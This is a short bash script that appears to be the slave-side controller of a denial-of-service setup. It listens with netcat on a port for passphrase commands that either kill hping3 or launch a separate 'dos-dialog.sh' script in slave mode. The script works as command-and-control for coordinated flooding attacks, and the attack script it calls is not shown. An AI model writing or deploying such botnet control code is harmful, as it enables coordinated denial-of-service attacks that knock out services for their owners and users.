#!/bin/bash
DEFAULT_PORT=111
SCRIPT_NAME=~/dos-dialog.sh
#Change this
PASSPHRASE=default
while true; do
NC_PACKET=`nc -l 112 -v`
if [ "${NC_PACKET}" = "stop hping3 ${PASSPHRASE}" ]; then
    killall hping3
    echo "Received kill signal."
elif [ "${NC_PACKET}" = "listen start ${PASSPHRASE}" ]; then
    ${SCRIPT_NAME} Slave ${DEFAULT_PORT} &
else
    echo ${NC_PACKET}
    echo "Either got wrong passphrase or bad syntax."
fi
done